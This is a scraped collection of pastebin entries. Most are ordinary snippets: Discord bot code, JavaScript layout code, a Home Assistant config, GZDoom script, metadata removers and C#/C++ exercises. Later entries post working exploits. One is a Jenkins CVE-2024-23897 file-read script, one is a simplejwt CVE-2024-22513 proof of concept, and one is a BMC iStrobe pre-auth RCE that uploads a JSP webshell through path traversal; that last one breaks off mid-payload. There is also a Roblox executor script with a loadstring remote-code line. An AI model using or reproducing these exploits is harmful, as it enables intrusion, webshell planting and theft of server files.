        r2, g2, b2 = pixels
        distance = ((r2-r1)**2 + (g2-g1)**2 + (b2-b1)**2) ** 0.5
        
        distancesList.append(distance)

    sortedList = sorted(distancesList)
    idx = distancesList.index(sortedList[0])

    return list(COLORS.values())[idx]

client.run(TOKEN)"
pJvG0LJK,Untitled,Igor150195,JavaScript,Thursday 18th of April 2024 09:28:57 AM CDT,"window.addEventListener('DOMContentLoaded', function () {
    let timeout;

    function setEqualHeight() {
        let items = document.querySelectorAll('.review-item');
        let maxHeight = Math.max(...Array.from(items, item => {
            item.style.height = '';
            return item.offsetHeight;
        }));
        items.forEach(item => item.style.height = `${maxHeight}px`);
    };

    document.fonts.ready
        .then(() => {
            setTimeout(function () {
                setEqualHeight();
            }, 100)
        })
        .catch(() => {
            console.log(""Fonts loading error"");
        });

    window.addEventListener('resize', ()=> {
        if (timeout) {
            clearInterval(timeout);
        };

        timeout = setTimeout(() => {
            setEqualHeight();
        }, 50);
    });
});

"
St5kw7n8,Artist Diff,branch_m,JavaScript,Thursday 18th of April 2024 09:19:53 AM CDT,"var trgt=0;
const st=t[""playerstats""][""stats""];
for(var i=0;i<st.length;i++){
    if(st[i].name==""DBD_Chapter22_Slasher_Stat1""){trgt = st[i].value;break;}};"
N8dE1fnw,RayCrow,branch_m,JavaScript,Thursday 18th of April 2024 09:17:16 AM CDT,"var count=0;const tz=""Asia/Tokyo"";const ty=""2-digit"";
const s=c[""playerstats""][""stats""];
for(var i=0;i<s.length;i++){
    if(s[i].name==""DBD_Chapter22_Slasher_Stat1""){count = s[i].value;break;}};"
xjXXU9U1,Doom zscript GZdoom run at level start,metalx1000,C,Thursday 18th of April 2024 09:13:19 AM CDT," class HelloWorldHandler : EventHandler
 {
     override void WorldLoaded (WorldEvent e)
     {
          
          //displayes messages to console
         console.printf(""Hello World!"");
         Console.Printf(TEXTCOLOR_BLUE .. ""Hello\n"");

         //Play a Sound
         S_StartSound (""grunt/death"", CHAN_VOICE);
     }
 }

  // Put this in a MAPINFO lump
 gameinfo
 {
     AddEventHandlers = ""HelloWorldHandler""
 }

"
t6G4CQGU,Untitled,yurghie,YAML,Thursday 18th of April 2024 08:32:46 AM CDT,"sensor:
  - platform: nordpool
    VAT: true
    currency: ""NOK""
    price_in_cents: false
    low_price_cutoff: 0.95
    region: ""Kr.sand""
    precision: 4
    price_type: kWh
    additional_costs: >-
      {% set s = {
        ""paaslag"": 0.00,
        ""nettleie_natt"": 0.38,
        ""nettleie_dag"": 0.50
      }%}
      {% set add_cost = 0.9 * (current_price - 0.9125) * -1 if current_price > 0.9125 else 0 %}
      {% set add_cost = s.paaslag + add_cost + s.nettleie_dag if now().hour >=6 and now().hour < 22 else s.paaslag + add_cost + s.nettleie_natt %}
      {{add_cost | float(3) }}"
cJTXQWQx,FE Telekineses (Script) #1,Dark_Agent,Lua,Thursday 18th of April 2024 07:01:30 AM CDT,"-- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
-- loadstring(game:HttpGet(""https://pastebin.com/raw/cJTXQWQx""))()
local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == ""script"" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local g = {}
local h = Instance.new(""Model"", game:GetService(""Lighting""))
local i = Instance.new(""Tool"")
local j = Instance.new(""Part"")
local k = Instance.new(""Script"")
local l = Instance.new(""LocalScript"")
local m = sethiddenproperty or set_hidden_property
i.Name = ""Telekinesis""
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = ""Handle""
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new(""Really black"")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new(""Really black"")
k.Name = ""LineConnect""
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new(""Part"")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = ""Laser""
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new(""BlockMesh"")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = ""MainScript""
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new(""BodyPosition"")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 1.1
            dist = nil
            point = Instance.new(""Part"")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new(""SpecialMesh"")
            s.MeshType = ""Sphere""
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new(""ObjectValue"")
                w.Value = o
                w.Name = ""Part1""
                local x = Instance.new(""ObjectValue"")
                x.Value = p
                x.Name = ""Part2""
                local y = Instance.new(""ObjectValue"")
                y.Value = q
                y.Name = ""Par""
                local z = Instance.new(""ObjectValue"")
                z.Value = color
                z.Name = ""Color""
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == ""q"" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == ""r"" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == ""BodyGyro"" then
                            return nil
                        end
                    end
                    BG = Instance.new(""BodyGyro"")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == ""BodyGyro"" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == ""e"" then
                    dist = dist + 10
                end
                if E == ""t"" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == ""y"" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == ""="" then
                    BP.P = BP.P * 1.5
                end
                if E == ""-"" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                B.Button1Down:connect(
                    function()
                        onButton1Down(B)
                    end
                )
                B.Button1Up:connect(
                    function()
                        mousedown = false
                    end
                )
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = ""rbxasset://textures\\GunCursor.png""
            end
            tool.Equipped:connect(onEquipped)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService(""Players"").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end"
Gs7erne0,Bash- Metaremover,N3ll4,Bash,Thursday 18th of April 2024 07:01:12 AM CDT,"#!/bin/bash

if ! command -v exiftool &> /dev/null
then
    echo ""exiftool ist nicht installiert. Bitte installieren Sie es, um fortzufahren.""
    exit 1
fi

if [ -z ""$1"" ]
then
    echo ""Bitte geben Sie den Pfad zur Datei als Argument ein.""
    exit 1
fi

file_path=""$1""

if [ ! -f ""$file_path"" ]
then
    echo ""Die angegebene Datei existiert nicht.""
    exit 1
fi

echo ""Entferne Metadaten aus $file_path ...""
exiftool -all= -overwrite_original ""$file_path""

echo ""Metadaten wurden aus $file_path entfernt.""
"
jrL2y9hc,„Éù„ÉÉ„Éó„É≥„Çπ„Ç≥„Ç¢„ÉÑ„Éº„É´ User CSS,ransempx,CSS,Thursday 18th of April 2024 06:57:54 AM CDT,"/* for https://otoge-flow-flow.com/ */

.accordion-item{
    margin-top: 2em;
    margin-bottom: 1em;
}

.gridjs-tr:nth-child(even) .gridjs-td{
	background-color: #ececec;
}

.gridjs-tr .gridjs-td{
    border: none;
}

thead .gridjs-th{
   background-color: #9fd4f9;
}

.gridjs-wrapper{
    height: fit-content !important;
    overflow: hidden;
    margin: 0 auto;
    width: 640px;
    resize: horizontal;
    border: collapse
    padding-bottom: 1em;
}

div.gridjs-search{
    margin: 0 auto;
    float: none;
}"
hzmmYxv2,Check if I have duplicates in the <title> or <description> tag,nicuf,Python,Thursday 18th of April 2024 06:55:43 AM CDT,"import os
import re
from collections import defaultdict

# Calea cƒÉtre directorul cu fi»ôierele HTML
directory_path = r'e:\Carte\BB\17 - Site Leadership\Principal\ro'

# Dic»õionare pentru a »õine eviden»õa titlurilor »ôi descrierilor »ôi fi»ôierelor corespunzƒÉtoare
titles_dict = defaultdict(list)
descriptions_dict = defaultdict(list)

# Parcurgem fiecare fi»ôier √Æn directorul specificat
for filename in os.listdir(directory_path):
    if filename.endswith("".html""):  # VerificƒÉm dacƒÉ fi»ôierul este un HTML
        filepath = os.path.join(directory_path, filename)
        print(f""Procesez fi»ôierul: {filename}"")  # Afi»ôƒÉm fi»ôierul curent procesat
        try:
            with open(filepath, 'r', encoding='utf-8', errors='replace') as file:
                content = file.read()

                # CƒÉutƒÉm titlul √Æn con»õinutul fi»ôierului
                title_match = re.search(r'<title>(.*?)</title>', content)
                if title_match:
                    title = title_match.group(1)
                    titles_dict[title].append(filename)

                # CƒÉutƒÉm descrierea √Æn con»õinutul fi»ôierului
                description_match = re.search(r'<meta name=""description"" content=""(.*?)"">', content)
                if description_match:
                    description = description_match.group(1)
                    descriptions_dict[description].append(filename)

        except UnicodeDecodeError:
            print(f""Nu am putut decoda fi»ôierul {filename} folosind UTF-8, chiar »ôi cu errors='replace'."")

# VerificƒÉm dacƒÉ existƒÉ titluri duplicate √Æn mai multe fi»ôiere
print(""Dubluri pentru titluri:"")
for title, files in titles_dict.items():
    if len(files) > 1:
        print(f""Titlul '{title}' apare √Æn urmƒÉtoarele fi»ôiere:"")
        for index, file in enumerate(files, start=1):
            print(f""{index}. {file}"")

print(""\nDubluri pentru descrieri:"")
# VerificƒÉm dacƒÉ existƒÉ descrieri duplicate √Æn mai multe fi»ôiere
for description, files in descriptions_dict.items():
    if len(files) > 1:
        print(f""\nDescrierea '{description}' apare √Æn urmƒÉtoarele fi»ôiere:"")
        for index, file in enumerate(files, start=1):
            print(f""{index}. {file}"")
"
zRNLJCSJ,AbstactClassWorker,cuniszkiewicz,C#,Thursday 18th of April 2024 06:47:03 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace abstractClass_06_06_2017
{
    class Program
    {
        interface IWorker
        {
            string Name { get; set; }
            string Surname { get; set; }
            void SetSalary(int a);
            void PaySalary();   
        }
        interface IManager
        {
            int ManagerAdd { get; set; }
        }
        abstract class Worker : IWorker
        {
            private string _name;
            private string _surname;
            private int _salary;


            public string Name
            {
                get { return _name; }
                set { _name = value; }
            }
            public string Surname
            {
                get { return _surname; }
                set { _surname = value; }
            }
            public int Salary
            {
                get { return _salary; }
                set
                {
                    if (value > 0)
                        _salary = value;
                    else
                        _salary = 2000;
                }
            }

            public void SetSalary(int p = 2000) { Salary = p; }
            public virtual void PaySalary() { Console.Write($""Salary to pay: {Salary} z≈Ç""); }

            protected Worker()
            {
                SetSalary();
            }
        }

        class Manager : Worker, IWorker, IManager
        {
            private int _managerAdd;
            private int _monthlyBonus;
            public int ManagerAdd
            {
                get { return _managerAdd; }
                set
                {
                    if (value > 0)
                        _managerAdd = value;
                    else
                        _managerAdd = 2000;
                }
            }
            public int MonthlyBonus
            {
                get { return _monthlyBonus; }
                set
                {
                    if (value > 0)
                        _monthlyBonus = value;
                    else
                        _monthlyBonus = 1000;
                }
            }
            public override void PaySalary()
            {
                Console.WriteLine($""Salary to pay: {Salary + ManagerAdd + MonthlyBonus} z≈Ç"");
            }
            public Manager()
            {
                ManagerAdd = 2000;
                MonthlyBonus = 1000;
            }

        }

        class Seller : Worker
        {
            private int _monthlyBonus;
            public int MonthlyBonus
            {
                get { return _monthlyBonus; }
                set
                {
                    if (value > 0)
                        _monthlyBonus = value;
                    else
                        _monthlyBonus = 500;
                }
            }
            public override void PaySalary()
            {
                base.PaySalary();
                Console.Write($"" and additional {MonthlyBonus} z≈Ç monthly bonus"");
            }
            public Seller()
            {
                MonthlyBonus = 500;
            }
        }

        static void Main(string[] args)
        {

           
            Manager manager = new Manager()
            manager.PaySalary();
            Seller seller = new Seller();
            seller.PaySalary();

            Console.ReadKey();
        }
    }f
}
"
eHTpAHMq,Powershell - Metaremover,N3ll4,PowerShell,Thursday 18th of April 2024 06:43:23 AM CDT,"$imagePath = Read-Host ""Bitte geben Sie den Pfad zur Bilddatei ein""

try {
   
    $imagePath = $imagePath -replace '""', ''

   
    $image = [System.Drawing.Image]::FromFile($imagePath)

   
    $tempPath = [System.IO.Path]::GetTempFileName()
    $image.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Bmp)  
    $image.Dispose()

    $newImage = [System.Drawing.Image]::FromFile($tempPath)
    $newImage.Save($imagePath, [System.Drawing.Imaging.ImageFormat]::Png)  
    $newImage.Dispose()

    Remove-Item $tempPath 

    Write-Output ""Metadaten von Bild $imagePath entfernt.""
} catch {
    Write-Output ""Fehler beim Entfernen der Metadaten: $_""
}
"
wAUwbV4Y,Untitled,sissou123,Java,Thursday 18th of April 2024 06:33:14 AM CDT,"The Complete Java Programmer: From Scratch to Advanced
Learn all the fundamental and advanced concepts(OOPS, Files, Data Structures) of Java using real-world examples. 
What you'll learn
Core concepts of Java from the Beginning upto coding Java for Android
Learn how to write a Java program 
for more :https://cuty.io/M1mBrYWNexb
"
2KwDspxp,Untitled,ebleach7,TypeScript,Thursday 18th of April 2024 06:16:51 AM CDT,"import { ErrorBoundary } from ""@/components"";
import {
  CompanyMetrics,
  FaqCreatePage,
  FaqItemPage,
  FaqPage,
  LocalizationPage,
  NotFoundPage,
  SignInPage,
} from ""@/pages"";
import { withSuspense } from ""@/shared/hocs"";
import { Navigate, createBrowserRouter } from ""react-router-dom"";
import { AppLayout, AuthLayout } from ""../layouts"";
import { RequireAuthProvider } from ""../providers"";

export const routes = createBrowserRouter([
  {
    errorElement: <ErrorBoundary />,
    element: withSuspense(RequireAuthProvider),
    children: [
      {
        errorElement: <ErrorBoundary />,
        element: withSuspense(AppLayout),
        children: [
          {
            path: ""/"",
            element: <Navigate to={""/localization""} />,
          },
          {
            path: ""/localization"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(LocalizationPage),
          },
          {
            path: ""/faq"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(FaqPage),
          },
          {
            path: ""/faq/create"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(FaqCreatePage),
          },
          {
            path: ""/faq/:faqItemId"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(FaqItemPage),
          },
          {
            path: ""/company-metrics"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(CompanyMetrics),
          },
          {
            path: ""*"",
            errorElement: <ErrorBoundary />,
            element: withSuspense(NotFoundPage),
          },
        ],
      },
    ],
  },
  {
    errorElement: <ErrorBoundary />,
    element: withSuspense(AuthLayout),
    children: [
      {
        path: ""/sign-in"",
        errorElement: <ErrorBoundary />,
        element: withSuspense(SignInPage),
      },
    ],
  },
  {
    path: ""*"",
    element: withSuspense(NotFoundPage),
  },
]);
"
gQFViErp,Untitled,35657,C++,Thursday 18th of April 2024 06:08:18 AM CDT,"#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	ifstream fin; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fin.open(""C:/Users/PC/Desktop/file.txt""); // –æ—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è

	if (!fin.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		string str; // –∑–∞–≤–æ–¥–∏–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é - –±—É—Ñ–µ—Ä
		while (!fin.eof()) { // –ø—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –≤ —Ñ–∞–π–ª–µ —á—Ç–æ-—Ç–æ –µ—Å—Ç—å
			getline(fin, str); // —Å—á–∏—Ç—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —Å —Ñ–∞–π–ª–∞ –¥–æ –ø–µ—Ä–µ–≤–æ–¥–∞ —Å—Ç—Ä–æ–∫–∏ (–≤–º–µ—Å—Ç–µ —Å –ø—Ä–æ–±–µ–ª–∞–º–∏)
			cout << str << endl;
			//str.clear(); // –µ—Å–ª–∏ –µ—Å—Ç—å –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏, –Ω—É–∂–Ω–æ –æ—á–∏—â–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –∏–ª–∏ –∏–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é –≤—ã–≤–æ–¥–∞ –ª–∏—à–Ω–µ–π —Å—Ç—Ä–æ–∫–∏
		}
		fin.close(); 
	}

}"
NZhBLeRA,Jenkins 2.441 - Local File Inclusion - CVE-2024-23897,FlyFar,Python,Thursday 18th of April 2024 06:06:30 AM CDT,"# Exploit Title: Jenkins 2.441 - Local File Inclusion
# Date: 14/04/2024
# Exploit Author: Matisse Beckandt (Backendt)
# Vendor Homepage: https://www.jenkins.io/
# Software Link: https://github.com/jenkinsci/jenkins/archive/refs/tags/jenkins-2.441.zip
# Version: 2.441
# Tested on: Debian 12 (Bookworm)
# CVE: CVE-2024-23897

from argparse import ArgumentParser
from requests import Session, post, exceptions
from threading import Thread
from uuid import uuid4
from time import sleep
from re import findall

class Exploit(Thread):
  def __init__(self, url: str, identifier: str):
    Thread.__init__(self)
    self.daemon = True
    self.url = url
    self.params = {""remoting"": ""false""}
    self.identifier = identifier
    self.stop_thread = False
    self.listen = False

  def run(self):
    while not self.stop_thread:
      if self.listen:
        self.listen_and_print()

  def stop(self):
    self.stop_thread = True

  def receive_next_message(self):
    self.listen = True

  def wait_for_message(self):
    while self.listen:
      sleep(0.5)

  def print_formatted_output(self, output: str):
    if ""ERROR: No such file"" in output:
      print(""File not found."")
    elif ""ERROR: Failed to parse"" in output:
      print(""Could not read file."")

    expression = ""No such agent \""(.*)\"" exists.""
    results = findall(expression, output)
    print(""\n"".join(results))

  def listen_and_print(self):
    session = Session()
    headers = {""Side"": ""download"", ""Session"": self.identifier}
    try:
      response = session.post(self.url, params=self.params, headers=headers)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print(""Could not connect to target to setup the listener."")
      exit(1)

    self.print_formatted_output(response.text)
    self.listen = False

  def send_file_request(self, filepath: str):
    headers = {""Side"": ""upload"", ""Session"": self.identifier}
    payload = get_payload(filepath)
    try:
      post(self.url, data=payload, params=self.params, headers=headers, timeout=4)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print(""Could not connect to the target to send the request."")
      exit(1)

  def read_file(self, filepath: str):
    self.receive_next_message()
    sleep(0.1)
    self.send_file_request(filepath)
    self.wait_for_message()

def get_payload_message(operation_index: int, text: str) -> bytes:
  text_bytes = bytes(text, ""utf-8"")
  text_size = len(text_bytes)
  text_message = text_size.to_bytes(2) + text_bytes
  message_size = len(text_message)

  payload = message_size.to_bytes(4) + operation_index.to_bytes(1) + text_message
  return payload

def get_payload(filepath: str) -> bytes:
  arg_operation = 0
  start_operation = 3

  command = get_payload_message(arg_operation, ""connect-node"")
  poisoned_argument = get_payload_message(arg_operation, f""@{filepath}"")

  payload = command + poisoned_argument + start_operation.to_bytes(1)
  return payload

def start_interactive_file_read(exploit: Exploit):
  print(""Press Ctrl+C to exit"")
  while True:
    filepath = input(""File to download:\n> "")
    filepath = make_path_absolute(filepath)
    exploit.receive_next_message()

    try:
      exploit.read_file(filepath)
    except exceptions.ReadTimeout:
      print(""Payload request timed out."")

def make_path_absolute(filepath: str) -> str:
    if not filepath.startswith('/'):
      return f""/proc/self/cwd/{filepath}""
    return filepath

def format_target_url(url: str) -> str:
  if url.endswith('/'):
    url = url[:-1]
  return f""{url}/cli""

def get_arguments():
  parser = ArgumentParser(description=""Local File Inclusion exploit for CVE-2024-23897"")
  parser.add_argument(""-u"", ""--url"", required=True, help=""The url of the vulnerable Jenkins service. Ex: http://helloworld.com/"")
  parser.add_argument(""-p"", ""--path"", help=""The absolute path of the file to download"")
  return parser.parse_args()

def main():
  args = get_arguments()
  url = format_target_url(args.url)
  filepath = args.path
  identifier = str(uuid4())

  exploit = Exploit(url, identifier)
  exploit.start()

  if filepath:
    filepath = make_path_absolute(filepath)
    exploit.read_file(filepath)
    exploit.stop()
    return

  try:
    start_interactive_file_read(exploit)
  except KeyboardInterrupt:
    pass
  print(""\nQuitting"")
  exploit.stop()

if __name__ == ""__main__"":
  main()
            "
6DA1qLFY,djangorestframework-simplejwt 5.3.1 - Information Disclosure - CVE-2024-22513,FlyFar,Python,Thursday 18th of April 2024 06:05:53 AM CDT,"# Exploit Title: djangorestframework-simplejwt 5.3.1 - Information Disclosure
# Date: 26/01/2024
# Exploit Author: Dhrumil Mistry (dmdhrumilmistry)
# Vendor Homepage: https://github.com/jazzband/djangorestframework-simplejwt/
# Software Link:https://github.com/jazzband/djangorestframework-simplejwt/releases/tag/v5.3.1
# Version: <= 5.3.1
# Tested on: MacOS
# CVE : CVE-2024-22513

# The version of djangorestframework-simplejwt up to 5.3.1 is vulnerable.
# This vulnerability has the potential to cause various security issues,
# including Business Object Level Authorization (BOLA), Business Function
# Level Authorization (BFLA), Information Disclosure, etc. The vulnerability
# arises from the fact that a user can access web application resources even
# after their account has been disabled, primarily due to the absence of proper
# user validation checks.

# If a programmer generates a JWT token for an inactive user using
`AccessToken`
# class and `for_user` method then a JWT token is returned which can
be used for
# authentication across the django and django rest framework application.

# Start Django Shell using below command:
# python manage.py shell
# ----------------------------------------

# Create inactive user and generate token for the user
from django.contrib.auth.models import User
from rest_framework_simplejwt.tokens import AccessToken

# create inactive user
inactive_user_id = User.objects.create_user('testuser',
'test@example.com', 'testPassw0rd!', is_active=False).id

# django application programmer generates token for the inactive user
AccessToken.for_user(User.objects.get(id=inactive_user_id))  # error
should be raised since user is inactive

# django application verifying user token
AccessToken.for_user(User.objects.get(id=inactive_user_id)).verify() #
no exception is raised during verification of inactive user token
            "
Aw9RMDGW,Untitled,35657,C++,Thursday 18th of April 2024 06:04:31 AM CDT,"#include <iostream>
#include <fstream>

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	ifstream fin; // —Å–æ–∑–¥–∞–ª–∏ –æ–±—ä–µ–∫—Ç –∫–ª–∞—Å—Å–∞ fstream

	fin.open(""C:/Users/PC/Desktop/file.txt""); // –æ—Ç–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è

	if (!fin.is_open()) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç–∏ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞
		cout << ""–û—à–∏–±–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è —Ñ–∞–π–ª–∞"" << endl;
	}
	else {
		string str; // –∑–∞–≤–æ–¥–∏–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é - –±—É—Ñ–µ—Ä
		while (!fin.eof()) { // –ø—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –≤ —Ñ–∞–π–ª–µ —á—Ç–æ-—Ç–æ –µ—Å—Ç—å
			fin >> str; // —Å—á–∏—Ç—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —Å —Ñ–∞–π–ª–∞ –¥–æ –ø—Ä–æ–±–µ–ª–∞
			cout << str << endl;
			//str.clear(); // –µ—Å–ª–∏ –µ—Å—Ç—å –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏, –Ω—É–∂–Ω–æ –æ—á–∏—â–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –∏–ª–∏ –∏–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é –≤—ã–≤–æ–¥–∞ –ª–∏—à–Ω–µ–π —Å—Ç—Ä–æ–∫–∏
		}
		fin.close(); 
	}

}"
EdhPkpe4,BMC Compuware iStrobe Web - 20.13 - Pre-auth RCE - CVE-2023-40304,FlyFar,Python,Thursday 18th of April 2024 06:04:26 AM CDT,"#!/usr/bin/env python3

# Exploit Title: Pre-auth RCE on Compuware iStrobe Web
# Date: 01-08-2023
# Exploit Author: trancap
# Vendor Homepage: https://www.bmc.com/
# Version: BMC Compuware iStrobe Web - 20.13
# Tested on: zOS# CVE : CVE-2023-40304
# To exploit this vulnerability you'll need ""Guest access"" enabled. The vulnerability is quite simple and impacts a web upload form, allowing a path traversal and an arbitrary file upload (.jsp files)
# The vulnerable parameter of the form is ""fileName"". Using the form, one can upload a webshell (content of the webshell in the ""topicText"" parameter).# I contacted the vendor but he didn't consider this a vulnerability because of the Guest access needed.

import requests
import urllib.parse
import argparse
import sys

def upload_web_shell(url):
  data = {""fileName"":""../jsp/userhelp/ws.jsp"",""author"":""Guest"",""name"":""test"",""action"":""open"",""topicText"":""<%@
page import=\""java.lang.*,java.io.*,java.util.*\"" %><%Process
p=Runtime.getRuntime().exec(request.getParameter(\""cmd\""));BufferedReader
stdInput = new BufferedReader(new
InputStreamReader(p.getInputStream()));BufferedReader stdError = new
BufferedReader(new InputStreamReader(p.getErrorStream()));String
s=\""\"";while((s=stdInput.readLine()) !=
null){out.println(s);};s=\""\"";while((s=stdError.readLine()) !=
